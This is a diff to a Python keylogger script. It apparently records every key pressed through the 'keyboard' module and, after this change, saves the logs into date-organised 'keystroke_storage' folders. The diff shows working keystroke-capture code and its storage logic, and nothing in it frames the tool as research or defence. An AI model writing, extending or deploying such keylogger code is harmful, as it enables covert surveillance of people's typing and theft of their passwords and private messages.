@@ -2,6 +2,7 @@ import keyboard # for keylogs
 import json # for the time
 from threading import Timer
 from datetime import datetime
+import os
 
 # report timing
 
@@ -50,24 +51,39 @@ class Keylogger:
 
             key = specialCases.get(key, self.formatSpecialKey(key))
 
-        # finally, add the key name to our global `self.log` variable
+        # add the key name to the `self.log` variable
         self.log += key
 
     def update_filename(self):
         # construct the filename to be identified by start & end datetimes
         start_dt_str = self.formatTime(self.start_dt)
         end_dt_str = self.formatTime(self.end_dt)
-        self.filename = f"{start_dt_str}-+-{end_dt_str}"
+        self.filename = f"{start_dt_str}---{end_dt_str}"
 
     def report_to_file(self):
-        """This method creates a log file in the current directory that contains
+        """This method creates a log file that contains
         the current keylogs in the `self.log` variable"""
 
+        originalDirectory = os.getcwd()
+
+        now = datetime.now()
+        monthYear = now.strftime("%Y-%m")
+        dayMonth = now.strftime("%m-%d")
+
+        # The path for storing the file
+        curFolder = os.path.join(originalDirectory, "keystroke_storage", monthYear, dayMonth)
+        if not os.path.exists(curFolder):
+            os.makedirs(curFolder)
+        os.chdir(curFolder)
+
         # open the file in write mode (create it)
-        with open(f"Files\\{self.filename}.txt", "w") as f:
+        with open(f"{self.filename}.txt", "w") as f:
             print(self.log, file=f)
 
         print(f"[+] Saved Files\\{self.filename}.txt")
+
+        
+        os.chdir(originalDirectory) #Return back to the original directory
     
     def report(self):
         """
